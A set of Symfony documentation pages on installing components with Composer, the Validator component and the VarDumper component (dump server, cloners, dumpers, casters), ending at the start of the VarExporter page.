.. _how-to-install-and-use-the-symfony2-components:

How to Install and Use the Symfony Components
=============================================

If you're starting a new project (or already have a project) that will use
one or more components, the easiest way to integrate everything is with `Composer`_.
Composer is smart enough to download the component(s) that you need and take
care of autoloading so that you can begin using the libraries immediately.

This article will take you through using :doc:`/components/finder`, though
this applies to using any component.

Using the Finder Component
--------------------------

**1.** If you're creating a new project, create a new empty directory for it.

**2.** Open a terminal, step into this directory and use Composer to grab the library.

.. code-block:: terminal

    $ composer require symfony/finder

The name ``symfony/finder`` is written at the top of the documentation for
whatever component you want.

.. tip::

    `Install Composer`_ if you don't have it already present on your system.
    Depending on how you install, you may end up with a ``composer.phar``
    file in your directory. In that case, no worries! Your command line in that
    case is ``php composer.phar require symfony/finder``.

**3.** Write your code!

Once Composer has downloaded the component(s), all you need to do is include
the ``vendor/autoload.php`` file that was generated by Composer. This file
takes care of autoloading all of the libraries so that you can use them
immediately::

    // Project structure example:
    // my_project/
    //     data/
    //         ...              # Some project data
    //     src/
    //         my_script.php    # Main entry point
    //     vendor/
    //         autoload.php     # Autoloader generated by Composer
    //         ...              # Packages downloaded by Composer

    // File example: src/my_script.php
    // Autoloader relative path to this PHP file
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\Finder\Finder;

    $finder = new Finder();
    $finder->in('../data/');

    // rest of your PHP code...

Now what?
---------

Now, the component is installed and autoloaded. Read the specific component's
documentation to find out more about how to use it.

And have fun!

.. _Composer: https://getcomposer.org
.. _Install Composer: https://getcomposer.org/download/
The Validator Component
=======================

    The Validator component provides tools to validate values following the
    `JSR-303 Bean Validation specification`_.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/validator

.. include:: /components/require_autoload.rst.inc

Usage
-----

.. seealso::

    This article explains how to use the Validator features as an independent
    component in any PHP application. Read the :doc:`/validation` article to
    learn about how to validate data and entities in Symfony applications.

The Validator component behavior is based on two concepts:

* Constraints, which define the rules to be validated;
* Validators, which are the classes that contain the actual validation logic.

The following example shows how to validate that a string is at least 10
characters long::

    use Symfony\Component\Validator\Constraints\Length;
    use Symfony\Component\Validator\Constraints\NotBlank;
    use Symfony\Component\Validator\Validation;

    $validator = Validation::createValidator();
    $violations = $validator->validate('Bernhard', [
        new Length(['min' => 10]),
        new NotBlank(),
    ]);

    if (0 !== count($violations)) {
        // there are errors, now you can show them
        foreach ($violations as $violation) {
            echo $violation->getMessage().'<br>';
        }
    }

The  ``validate()`` method returns the list of violations as an object that
implements :class:`Symfony\\Component\\Validator\\ConstraintViolationListInterface`.
If you have lots of validation errors, you can filter them by error code::

    use Symfony\Bridge\Doctrine\Validator\Constraints\UniqueEntity;

    $violations = $validator->validate(/* ... */);
    if (0 !== count($violations->findByCodes(UniqueEntity::NOT_UNIQUE_ERROR))) {
        // handle this specific error (display some message, send an email, etc.)
    }

Retrieving a Validator Instance
-------------------------------

The Validator object (that implements :class:`Symfony\\Component\\Validator\\Validator\\ValidatorInterface`) is the main access
point of the Validator component. To create a new instance of it, it's
recommended to use the :class:`Symfony\\Component\\Validator\\Validation` class::

    use Symfony\Component\Validator\Validation;

    $validator = Validation::createValidator();

This ``$validator`` object can validate simple variables such as strings, numbers
and arrays, but it can't validate objects. To do so, configure the
``Validator`` as explained in the next sections.

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /components/validator/*
    /validation
    /validation/*

.. _`JSR-303 Bean Validation specification`: https://jcp.org/en/jsr/detail?id=303
The VarDumper Component
=======================

    The VarDumper component provides mechanisms for extracting the state out of
    any PHP variables. Built on top, it provides a better ``dump()`` function
    that you can use instead of :phpfunction:`var_dump`.

Installation
------------

.. code-block:: terminal

    $ composer require --dev symfony/var-dumper

.. include:: /components/require_autoload.rst.inc

.. note::

    If using it inside a Symfony application, make sure that the DebugBundle has
    been installed (or run ``composer require --dev symfony/debug-bundle`` to install it).

.. _components-var-dumper-dump:

The dump() Function
-------------------

The VarDumper component creates a global ``dump()`` function that you can
use instead of e.g. :phpfunction:`var_dump`. By using it, you'll gain:

* Per object and resource types specialized view to e.g. filter out
  Doctrine internals while dumping a single proxy entity, or get more
  insight on opened files with :phpfunction:`stream_get_meta_data`;
* Configurable output formats: HTML or colored command line output;
* Ability to dump internal references, either soft ones (objects or
  resources) or hard ones (``=&`` on arrays or objects properties).
  Repeated occurrences of the same object/array/resource won't appear
  again and again anymore. Moreover, you'll be able to inspect the
  reference structure of your data;
* Ability to operate in the context of an output buffering handler.

For example::

    require __DIR__.'/vendor/autoload.php';

    // create a variable, which could be anything!
    $someVar = ...;

    dump($someVar);

    // dump() returns the passed value, so you can dump an object and keep using it
    dump($someObject)->someMethod();

By default, the output format and destination are selected based on your
current PHP SAPI:

* On the command line (CLI SAPI), the output is written on ``STDOUT``. This
  can be surprising to some because this bypasses PHP's output buffering
  mechanism;
* On other SAPIs, dumps are written as HTML in the regular output.

.. tip::

    You can also select the output format explicitly defining the
    ``VAR_DUMPER_FORMAT`` environment variable and setting its value to either
    ``html``, ``cli`` or :ref:`server <var-dumper-dump-server-format>`.

.. note::

    If you want to catch the dump output as a string, please read the
    :ref:`advanced section <var-dumper-advanced>` which contains examples of
    it.
    You'll also learn how to change the format or redirect the output to
    wherever you want.

.. tip::

    In order to have the ``dump()`` function always available when running
    any PHP code, you can install it globally on your computer:

    #. Run ``composer global require symfony/var-dumper``;
    #. Add ``auto_prepend_file = ${HOME}/.composer/vendor/autoload.php``
       to your ``php.ini`` file;
    #. From time to time, run ``composer global update symfony/var-dumper``
       to have the latest bug fixes.

.. tip::

    The VarDumper component also provides a ``dd()`` ("dump and die") helper
    function. This function dumps the variables using ``dump()`` and
    immediately ends the execution of the script (using :phpfunction:`exit`).

.. _var-dumper-dump-server:

The Dump Server
---------------

The ``dump()`` function outputs its contents in the same browser window or
console terminal as your own application. Sometimes mixing the real output
with the debug output can be confusing. That's why this component provides a
server to collect all the dumped data.

Start the server with the ``server:dump`` command and whenever you call to
``dump()``, the dumped data won't be displayed in the output but sent to that
server, which outputs it to its own console or to an HTML file:

.. code-block:: terminal

    # displays the dumped data in the console:
    $ php bin/console server:dump
      [OK] Server listening on tcp://0.0.0.0:9912

    # stores the dumped data in a file using the HTML format:
    $ php bin/console server:dump --format=html > dump.html

Inside a Symfony application, the output of the dump server is configured with
the :ref:`dump_destination option <configuration-debug-dump_destination>` of the
``debug`` package:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/debug.yaml
        debug:
           dump_destination: "tcp://%env(VAR_DUMPER_SERVER)%"

    .. code-block:: xml

        <!-- config/packages/debug.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:debug="http://symfony.com/schema/dic/debug"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/debug
                https://symfony.com/schema/dic/debug/debug-1.0.xsd"
        >
            <debug:config dump-destination="tcp://%env(VAR_DUMPER_SERVER)%"/>
        </container>

    .. code-block:: php

        // config/packages/debug.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->extension('debug', [
                'dump_destination' => 'tcp://%env(VAR_DUMPER_SERVER)%',
            ]);
        };

Outside a Symfony application, use the :class:`Symfony\\Component\\VarDumper\\Dumper\\ServerDumper` class::

    require __DIR__.'/vendor/autoload.php';

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\CliDumper;
    use Symfony\Component\VarDumper\Dumper\ContextProvider\CliContextProvider;
    use Symfony\Component\VarDumper\Dumper\ContextProvider\SourceContextProvider;
    use Symfony\Component\VarDumper\Dumper\HtmlDumper;
    use Symfony\Component\VarDumper\Dumper\ServerDumper;
    use Symfony\Component\VarDumper\VarDumper;

    $cloner = new VarCloner();
    $fallbackDumper = \in_array(\PHP_SAPI, ['cli', 'phpdbg']) ? new CliDumper() : new HtmlDumper();
    $dumper = new ServerDumper('tcp://127.0.0.1:9912', $fallbackDumper, [
        'cli' => new CliContextProvider(),
        'source' => new SourceContextProvider(),
    ]);

    VarDumper::setHandler(function (mixed $var) use ($cloner, $dumper): ?string {
        return $dumper->dump($cloner->cloneVar($var));
    });

.. note::

    The second argument of :class:`Symfony\\Component\\VarDumper\\Dumper\\ServerDumper`
    is a :class:`Symfony\\Component\\VarDumper\\Dumper\\DataDumperInterface` instance
    used as a fallback when the server is unreachable. The third argument are the
    context providers, which allow to gather some info about the context in which the
    data was dumped. The built-in context providers are: ``cli``, ``request`` and ``source``.

Then you can use the following command to start a server out-of-the-box:

.. code-block:: terminal

     $ ./vendor/bin/var-dump-server
       [OK] Server listening on tcp://127.0.0.1:9912

.. _var-dumper-dump-server-format:

Configuring the Dump Server with Environment Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you prefer to not modify the application configuration (e.g. to quickly debug
a project given to you) use the ``VAR_DUMPER_FORMAT`` env var.

First, start the server as usual:

.. code-block:: terminal

    $ ./vendor/bin/var-dump-server

Then, run your code with the ``VAR_DUMPER_FORMAT=server`` env var by configuring
this value in the :ref:`.env file of your application <config-env-vars>`. For
console commands, you can also define this env var as follows:

.. code-block:: terminal

    $ VAR_DUMPER_FORMAT=server [your-cli-command]

.. note::

    The host used by the ``server`` format is the one configured in the
    ``VAR_DUMPER_SERVER`` env var or ``127.0.0.1:9912`` if none is defined.
    If you prefer, you can also configure the host in the ``VAR_DUMPER_FORMAT``
    env var like this: ``VAR_DUMPER_FORMAT=tcp://127.0.0.1:1234``.

DebugBundle and Twig Integration
--------------------------------

The DebugBundle allows greater integration of this component into Symfony
applications.

Since generating (even debug) output in the controller or in the model
of your application may just break it by e.g. sending HTTP headers or
corrupting your view, the bundle configures the ``dump()`` function so that
variables are dumped in the web debug toolbar.

But if the toolbar cannot be displayed because you e.g. called
``die()``/``exit()``/``dd()`` or a fatal error occurred, then dumps are written
on the regular output.

In a Twig template, two constructs are available for dumping a variable.
Choosing between both is mostly a matter of personal taste, still:

* ``{% dump foo.bar %}`` is the way to go when the original template output
  shall not be modified: variables are not dumped inline, but in the web
  debug toolbar;
* on the contrary, ``{{ dump(foo.bar) }}`` dumps inline and thus may or not
  be suited to your use case (e.g. you shouldn't use it in an HTML
  attribute or a ``<script>`` tag).

This behavior can be changed by configuring the ``debug.dump_destination``
option. Read more about this and other options in
:doc:`the DebugBundle configuration reference </reference/configuration/debug>`.

.. tip::

    If the dumped contents are complex, consider using the local search box to
    look for specific variables or values. First, click anywhere on the dumped
    contents and then press ``Ctrl. + F`` or ``Cmd. + F`` to make the local
    search box appear. All the common shortcuts to navigate the search results
    are supported (``Ctrl. + G`` or ``Cmd. + G``, ``F3``, etc.) When
    finished, press ``Esc.`` to hide the box again.

    If you want to use your browser search input, press ``Ctrl. + F`` or
    ``Cmd. + F`` again while focusing on VarDumper's search input.

Using the VarDumper Component in your PHPUnit Test Suite
--------------------------------------------------------

The VarDumper component provides
:class:`a trait <Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait>`
that can help writing some of your tests for PHPUnit.

This will provide you with two new assertions:

:method:`Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait::assertDumpEquals`
    verifies that the dump of the variable given as the second argument matches
    the expected dump provided as the first argument.

:method:`Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait::assertDumpMatchesFormat`
    is like the previous method but accepts placeholders in the expected dump,
    based on the ``assertStringMatchesFormat()`` method provided by PHPUnit.

The ``VarDumperTestTrait`` also includes these other methods:

:method:`Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait::setUpVarDumper`
    is used to configure the available casters and their options, which is a way
    to only control the fields you're expecting and allows writing concise tests.

:method:`Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait::tearDownVarDumper`
    is called automatically after each case to reset the custom configuration
    made in ``setUpVarDumper()``.

Example::

    use PHPUnit\Framework\TestCase;
    use Symfony\Component\VarDumper\Test\VarDumperTestTrait;

    class ExampleTest extends TestCase
    {
        use VarDumperTestTrait;

        protected function setUp(): void
        {
            $casters = [
                \DateTimeInterface::class => static function (\DateTimeInterface $date, array $a, Stub $stub): array {
                    $stub->class = 'DateTime';
                    return ['date' => $date->format('d/m/Y')];
                },
            ];

            $flags = CliDumper::DUMP_LIGHT_ARRAY | CliDumper::DUMP_COMMA_SEPARATOR;

            // this configures the casters & flags to use for all the tests in this class.
            // If you need custom configurations per test rather than for the whole class,
            // call this setUpVarDumper() method from those tests instead.
            $this->setUpVarDumper($casters, $flags);
        }

        public function testWithDumpEquals(): void
        {
            $testedVar = [123, 'foo'];

            // the expected dump contents don't have the default VarDumper structure
            // because of the custom casters and flags used in the test
            $expectedDump = <<<EOTXT
    [
      123,
      "foo",
    ]
    EOTXT;

            // if the first argument is a string, it must be the whole expected dump
            $this->assertDumpEquals($expectedDump, $testedVar);

            // if the first argument is not a string, assertDumpEquals() dumps it
            // and compares it with the dump of the second argument
            $this->assertDumpEquals($testedVar, $testedVar);
        }
    }

Dump Examples and Output
------------------------

For simple variables, reading the output should be straightforward.
Here are some examples showing first a variable defined in PHP,
then its dump representation::

    $var = [
        'a simple string' => "in an array of 5 elements",
        'a float' => 1.0,
        'an integer' => 1,
        'a boolean' => true,
        'an empty array' => [],
    ];
    dump($var);

.. image:: /_images/components/var_dumper/01-simple.png
    :alt: Dump output showing the array with length five and all keys and values.

.. note::

    The gray arrow is a toggle button for hiding/showing children of
    nested structures.

.. code-block:: php

    $var = "This is a multi-line string.\n";
    $var .= "Hovering a string shows its length.\n";
    $var .= "The length of UTF-8 strings is counted in terms of UTF-8 characters.\n";
    $var .= "Non-UTF-8 strings length are counted in octet size.\n";
    $var .= "Because of this `\xE9` octet (\\xE9),\n";
    $var .= "this string is not UTF-8 valid, thus the `b` prefix.\n";
    dump($var);

.. image:: /_images/components/var_dumper/02-multi-line-str.png
    :alt: Dump output showing the string on multiple lines in between three quotes.

.. code-block:: php

    class PropertyExample
    {
        public string $publicProperty = 'The `+` prefix denotes public properties,';
        protected string $protectedProperty = '`#` protected ones and `-` private ones.';
        private string $privateProperty = 'Hovering a property shows a reminder.';
    }

    $var = new PropertyExample();
    dump($var);

.. image:: /_images/components/var_dumper/03-object.png
    :alt: Dump output showing the PropertyExample object and all three properties with their values.

.. note::

    `#14` is the internal object handle. It allows comparing two
    consecutive dumps of the same object.

.. code-block:: php

    class DynamicPropertyExample
    {
        public string $declaredProperty = 'This property is declared in the class definition';
    }

    $var = new DynamicPropertyExample();
    $var->undeclaredProperty = 'Runtime added dynamic properties have `"` around their name.';
    dump($var);

.. image:: /_images/components/var_dumper/04-dynamic-property.png
    :alt: Dump output showing the DynamicPropertyExample object and both declared and undeclared properties with their values.

.. code-block:: php

    class ReferenceExample
    {
        public string $info = "Circular and sibling references are displayed as `#number`.\nHovering them highlights all instances in the same dump.\n";
    }
    $var = new ReferenceExample();
    $var->aCircularReference = $var;
    dump($var);

.. image:: /_images/components/var_dumper/05-soft-ref.png
    :alt: Dump output showing the "aCircularReference" property value referencing the parent object, instead of showing all properties again.

.. code-block:: php

    $var = new \ErrorException(
        "For some objects, properties have special values\n"
        ."that are best represented as constants, like\n"
        ."`severity` below. Hovering displays the value (`2`).\n",
        0,
        E_WARNING
    );
    dump($var);

.. image:: /_images/components/var_dumper/06-constants.png
    :alt: Dump output with the "E_WARNING" constant shown as value of "severity".

.. code-block:: php

    $var = [];
    $var[0] = 1;
    $var[1] =& $var[0];
    $var[1] += 1;
    $var[2] = ["Hard references (circular or sibling)"];
    $var[3] =& $var[2];
    $var[3][] = "are dumped using `&number` prefixes.";
    dump($var);

.. image:: /_images/components/var_dumper/07-hard-ref.png
    :alt: Dump output showing the referenced arrays.

.. code-block:: php

    $var = new \ArrayObject();
    $var[] = "Some resources and special objects like the current";
    $var[] = "one are sometimes best represented using virtual";
    $var[] = "properties that describe their internal state.";
    dump($var);

.. image:: /_images/components/var_dumper/08-virtual-property.png
    :alt: Dump output of the ArrayObject.

.. code-block:: php

    $var = new AcmeController(
        "When a dump goes over its maximum items limit,\n"
        ."or when some special objects are encountered,\n"
        ."children can be replaced by an ellipsis and\n"
        ."optionally followed by a number that says how\n"
        ."many have been removed; `9` in this case.\n"
    );
    dump($var);

.. image:: /_images/components/var_dumper/09-cut.png
    :alt: Dump output where the children of the Container object are hidden.

.. code-block:: php

    class Foo
    {
        // $foo is uninitialized, which is different from being null
        private int|float $foo;
        public ?string $baz = null;
    }

    $var = new Foo();
    dump($var);

.. image:: /_images/components/var_dumper/10-uninitialized.png
    :alt: Dump output where the uninitialized property is represented by a question mark followed by the type definition.

.. _var-dumper-advanced:

Advanced Usage
--------------

The ``dump()`` function is just a thin wrapper and a more convenient way to call
:method:`VarDumper::dump() <Symfony\\Component\\VarDumper\\VarDumper::dump>`.
You can change the behavior of this function by calling
:method:`VarDumper::setHandler($callable) <Symfony\\Component\\VarDumper\\VarDumper::setHandler>`.
Calls to ``dump()`` will then be forwarded to ``$callable``.

By adding a handler, you can customize the `Cloners`_, `Dumpers`_ and `Casters`_
as explained below. A simple implementation of a handler function might look
like this::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\CliDumper;
    use Symfony\Component\VarDumper\Dumper\HtmlDumper;
    use Symfony\Component\VarDumper\VarDumper;

    VarDumper::setHandler(function (mixed $var): ?string {
        $cloner = new VarCloner();
        $dumper = 'cli' === PHP_SAPI ? new CliDumper() : new HtmlDumper();

        return $dumper->dump($cloner->cloneVar($var));
    });

Cloners
~~~~~~~

A cloner is used to create an intermediate representation of any PHP variable.
Its output is a :class:`Symfony\\Component\\VarDumper\\Cloner\\Data`
object that wraps this representation.

You can create a ``Data`` object this way::

    use Symfony\Component\VarDumper\Cloner\VarCloner;

    $cloner = new VarCloner();
    $data = $cloner->cloneVar($myVar);
    // this is commonly then passed to the dumper
    // see the example at the top of this page
    // $dumper->dump($data);

Whatever the cloned data structure, resulting ``Data`` objects are always
serializable.

A cloner applies limits when creating the representation, so that one
can represent only a subset of the cloned variable.
Before calling :method:`Symfony\\Component\\VarDumper\\Cloner\\VarCloner::cloneVar`,
you can configure these limits:

:method:`Symfony\\Component\\VarDumper\\Cloner\\VarCloner::setMaxItems`
    Configures the maximum number of items that will be cloned
    *past the minimum nesting depth*. Items are counted using a breadth-first
    algorithm so that lower level items have higher priority than deeply nested
    items. Specifying ``-1`` removes the limit.

:method:`Symfony\\Component\\VarDumper\\Cloner\\VarCloner::setMinDepth`
    Configures the minimum tree depth where we are guaranteed to clone
    all the items. After this depth is reached, only ``setMaxItems``
    items will be cloned. The default value is ``1``, which is consistent
    with older Symfony versions.

:method:`Symfony\\Component\\VarDumper\\Cloner\\VarCloner::setMaxString`
    Configures the maximum number of characters that will be cloned before
    cutting overlong strings.  Specifying ``-1`` removes the limit.

Before dumping it, you can further limit the resulting
:class:`Symfony\\Component\\VarDumper\\Cloner\\Data` object using the following methods:

:method:`Symfony\\Component\\VarDumper\\Cloner\\Data::withMaxDepth`
    Limits dumps in the depth dimension.

:method:`Symfony\\Component\\VarDumper\\Cloner\\Data::withMaxItemsPerDepth`
    Limits the number of items per depth level.

:method:`Symfony\\Component\\VarDumper\\Cloner\\Data::withRefHandles`
    Removes internal objects' handles for sparser output (useful for tests).

:method:`Symfony\\Component\\VarDumper\\Cloner\\Data::seek`
    Selects only sub-parts of already cloned arrays, objects or resources.

Unlike the previous limits on cloners that remove data on purpose, these can
be changed back and forth before dumping since they do not affect the
intermediate representation internally.

.. note::

    When no limit is applied, a :class:`Symfony\\Component\\VarDumper\\Cloner\\Data`
    object is as accurate as the native :phpfunction:`serialize` function,
    and thus could be used for purposes beyond debugging.

Dumpers
~~~~~~~

A dumper is responsible for outputting a string representation of a PHP variable,
using a :class:`Symfony\\Component\\VarDumper\\Cloner\\Data` object as input.
The destination and the formatting of this output vary with dumpers.

This component comes with an :class:`Symfony\\Component\\VarDumper\\Dumper\\HtmlDumper`
for HTML output and a :class:`Symfony\\Component\\VarDumper\\Dumper\\CliDumper`
for optionally colored command line output.

For example, if you want to dump some ``$variable``, do::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $cloner = new VarCloner();
    $dumper = new CliDumper();

    $dumper->dump($cloner->cloneVar($variable));

By using the first argument of the constructor, you can select the output
stream where the dump will be written. By default, the ``CliDumper`` writes
on ``php://stdout`` and the ``HtmlDumper`` on ``php://output``. But any PHP
stream (resource or URL) is acceptable.

Instead of a stream destination, you can also pass it a ``callable`` that
will be called repeatedly for each line generated by a dumper. This
callable can be configured using the first argument of a dumper's constructor,
but also using the
:method:`Symfony\\Component\\VarDumper\\Dumper\\AbstractDumper::setOutput`
method or the second argument of the
:method:`Symfony\\Component\\VarDumper\\Dumper\\AbstractDumper::dump` method.

For example, to get a dump as a string in a variable, you can do::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $cloner = new VarCloner();
    $dumper = new CliDumper();
    $output = '';

    $dumper->dump(
        $cloner->cloneVar($variable),
        function (int $line, int $depth) use (&$output): void {
            // A negative depth means "end of dump"
            if ($depth >= 0) {
                // Adds a two spaces indentation to the line
                $output .= str_repeat('  ', $depth).$line."\n";
            }
        }
    );

    // $output is now populated with the dump representation of $variable

Another option for doing the same could be::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $cloner = new VarCloner();
    $dumper = new CliDumper();
    $output = fopen('php://memory', 'r+b');

    $dumper->dump($cloner->cloneVar($variable), $output);
    $output = stream_get_contents($output, -1, 0);

    // $output is now populated with the dump representation of $variable

.. tip::

    You can pass ``true`` to the second argument of the
    :method:`Symfony\\Component\\VarDumper\\Dumper\\AbstractDumper::dump`
    method to make it return the dump as a string::

        $output = $dumper->dump($cloner->cloneVar($variable), true);

Dumpers implement the :class:`Symfony\\Component\\VarDumper\\Dumper\\DataDumperInterface`
interface that specifies the
:method:`dump(Data $data) <Symfony\\Component\\VarDumper\\Dumper\\DataDumperInterface::dump>`
method. They also typically implement the
:class:`Symfony\\Component\\VarDumper\\Cloner\\DumperInterface` that frees
them from re-implementing the logic required to walk through a
:class:`Symfony\\Component\\VarDumper\\Cloner\\Data` object's internal structure.

The :class:`Symfony\\Component\\VarDumper\\Dumper\\HtmlDumper` uses a dark
theme by default. Use the :method:`Symfony\\Component\\VarDumper\\Dumper\\HtmlDumper::setTheme`
method to use a light theme::

    // ...
    $htmlDumper->setTheme('light');

The :class:`Symfony\\Component\\VarDumper\\Dumper\\HtmlDumper` limits string
length and nesting depth of the output to make it more readable. These options
can be overridden by the third optional parameter of the
:method:`dump(Data $data) <Symfony\\Component\\VarDumper\\Dumper\\DataDumperInterface::dump>`
method::

    use Symfony\Component\VarDumper\Dumper\HtmlDumper;

    $output = fopen('php://memory', 'r+b');

    $dumper = new HtmlDumper();
    $dumper->dump($var, $output, [
        // 1 and 160 are the default values for these options
        'maxDepth' => 1,
        'maxStringLength' => 160,
    ]);

The output format of a dumper can be fine tuned by the two flags
``DUMP_STRING_LENGTH`` and ``DUMP_LIGHT_ARRAY`` which are passed as a bitmap
in the third constructor argument. They can also be set via environment
variables when using
:method:`assertDumpEquals($dump, $data, $filter, $message) <Symfony\\Component\\VarDumper\\Test\\VarDumperTestTrait::assertDumpEquals>`
during unit testing.

The ``$filter`` argument of ``assertDumpEquals()`` can be used to pass a
bit field of ``Caster::EXCLUDE_*`` constants and influences the expected
output produced by the different casters.

If ``DUMP_STRING_LENGTH`` is set, then the length of a string is displayed
next to its content::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\AbstractDumper;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $varCloner = new VarCloner();
    $var = ['test'];

    $dumper = new CliDumper();
    echo $dumper->dump($varCloner->cloneVar($var), true);

    // array:1 [
    //   0 => "test"
    // ]

    $dumper = new CliDumper(null, null, AbstractDumper::DUMP_STRING_LENGTH);
    echo $dumper->dump($varCloner->cloneVar($var), true);

    // (added string length before the string)
    // array:1 [
    //   0 => (4) "test"
    // ]

If ``DUMP_LIGHT_ARRAY`` is set, then arrays are dumped in a shortened format
similar to PHP's short array notation::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\AbstractDumper;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $varCloner = new VarCloner();
    $var = ['test'];

    $dumper = new CliDumper();
    echo $dumper->dump($varCloner->cloneVar($var), true);

    // array:1 [
    //   0 => "test"
    // ]

    $dumper = new CliDumper(null, null, AbstractDumper::DUMP_LIGHT_ARRAY);
    echo $dumper->dump($varCloner->cloneVar($var), true);

    // (no more array:1 prefix)
    // [
    //   0 => "test"
    // ]

If you would like to use both options, then you can combine them by
using the logical OR operator ``|``::

    use Symfony\Component\VarDumper\Cloner\VarCloner;
    use Symfony\Component\VarDumper\Dumper\AbstractDumper;
    use Symfony\Component\VarDumper\Dumper\CliDumper;

    $varCloner = new VarCloner();
    $var = ['test'];

    $dumper = new CliDumper(null, null, AbstractDumper::DUMP_STRING_LENGTH | AbstractDumper::DUMP_LIGHT_ARRAY);
    echo $dumper->dump($varCloner->cloneVar($var), true);

    // [
    //   0 => (4) "test"
    // ]

Casters
~~~~~~~

Objects and resources nested in a PHP variable are "cast" to arrays in the
intermediate :class:`Symfony\\Component\\VarDumper\\Cloner\\Data`
representation. You can customize the array representation for each object/resource
by hooking a Caster into this process. The component already includes many
casters for base PHP classes and other common classes.

If you want to build your own Caster, you can register one before cloning
a PHP variable. Casters are registered using either a Cloner's constructor
or its ``addCasters()`` method::

    use Symfony\Component\VarDumper\Cloner\VarCloner;

    $myCasters = [...];
    $cloner = new VarCloner($myCasters);

    // or

    $cloner->addCasters($myCasters);

The provided ``$myCasters`` argument is an array that maps a class,
an interface or a resource type to a callable::

    $myCasters = [
        'FooClass' => $myFooClassCallableCaster,
        ':bar resource' => $myBarResourceCallableCaster,
    ];

As you can notice, resource types are prefixed by a ``:`` to prevent
colliding with a class name.

Because an object has one main class and potentially many parent classes
or interfaces, many casters can be applied to one object. In this case,
casters are called one after the other, starting from casters bound to the
interfaces, the parents classes and then the main class. Several casters
can also be registered for the same resource type/class/interface.
They are called in registration order.

Casters are responsible for returning the properties of the object or resource
being cloned in an array. They are callables that accept five arguments:

* the object or resource being casted;
* an array modeled for objects after PHP's native ``(array)`` cast operator;
* a :class:`Symfony\\Component\\VarDumper\\Cloner\\Stub` object
  representing the main properties of the object (class, type, etc.);
* true/false when the caster is called nested in a structure or not;
* A bit field of :class:`Symfony\\Component\\VarDumper\\Caster\\Caster` ``::EXCLUDE_*``
  constants.

Here is a simple caster not doing anything::

    use Symfony\Component\VarDumper\Cloner\Stub;

    function myCaster(mixed $object, array $array, Stub $stub, bool $isNested, int $filter): array
    {
        // ... populate/alter $array to your needs

        return $array;
    }

For objects, the ``$array`` parameter comes pre-populated using PHP's native
``(array)`` casting operator or with the return value of ``$object->__debugInfo()``
if the magic method exists. Then, the return value of one Caster is given
as the array argument to the next Caster in the chain.

When casting with the ``(array)`` operator, PHP prefixes protected properties
with a ``\0*\0`` and private ones with the class owning the property. For example,
``\0Foobar\0`` will be the prefix for all private properties of objects of
type Foobar. Casters follow this convention and add two more prefixes: ``\0~\0``
is used for virtual properties and ``\0+\0`` for dynamic ones (runtime added
properties not in the class declaration).

.. note::

    Although you can, it is advised to not alter the state of an object
    while casting it in a Caster.

.. tip::

    Before writing your own casters, you should check the existing ones.

Adding Semantics with Metadata
..............................

Since casters are hooked on specific classes or interfaces, they know about the
objects they manipulate. By altering the ``$stub`` object (the third argument of
any caster), one can transfer this knowledge to the resulting ``Data`` object,
thus to dumpers. To help you do this (see the source code for how it works),
the component comes with a set of wrappers for common additional semantics. You
can use:

* :class:`Symfony\\Component\\VarDumper\\Caster\\ConstStub` to wrap a value that is
  best represented by a PHP constant;
* :class:`Symfony\\Component\\VarDumper\\Caster\\ClassStub` to wrap a PHP identifier
  (*i.e.* a class name, a method name, an interface, *etc.*);
* :class:`Symfony\\Component\\VarDumper\\Caster\\CutStub` to replace big noisy
  objects/strings/*etc.* by ellipses;
* :class:`Symfony\\Component\\VarDumper\\Caster\\CutArrayStub` to keep only some
  useful keys of an array;
* :class:`Symfony\\Component\\VarDumper\\Caster\\ImgStub` to wrap an image;
* :class:`Symfony\\Component\\VarDumper\\Caster\\EnumStub` to wrap a set of virtual
  values (*i.e.* values that do not exist as properties in the original PHP data
  structure, but are worth listing alongside with real ones);
* :class:`Symfony\\Component\\VarDumper\\Caster\\LinkStub` to wrap strings that can
  be turned into links by dumpers;
* :class:`Symfony\\Component\\VarDumper\\Caster\\TraceStub` and their
* :class:`Symfony\\Component\\VarDumper\\Caster\\FrameStub` and
* :class:`Symfony\\Component\\VarDumper\\Caster\\ArgsStub` relatives to wrap PHP
  traces (used by :class:`Symfony\\Component\\VarDumper\\Caster\\ExceptionCaster`).

For example, if you know that your ``Product`` objects have a ``brochure`` property
that holds a file name or a URL, you can wrap them in a ``LinkStub`` to tell
``HtmlDumper`` to make them clickable::

    use Symfony\Component\VarDumper\Caster\LinkStub;
    use Symfony\Component\VarDumper\Cloner\Stub;

    function ProductCaster(Product $object, array $array, Stub $stub, bool $isNested, int $filter = 0): array
    {
        $array['brochure'] = new LinkStub($array['brochure']);

        return $array;
    }
The VarExporter Component
=========================

    The VarExporter component exports any serializable PHP data structure to
    plain PHP code and allows to instantiate and populate objects without
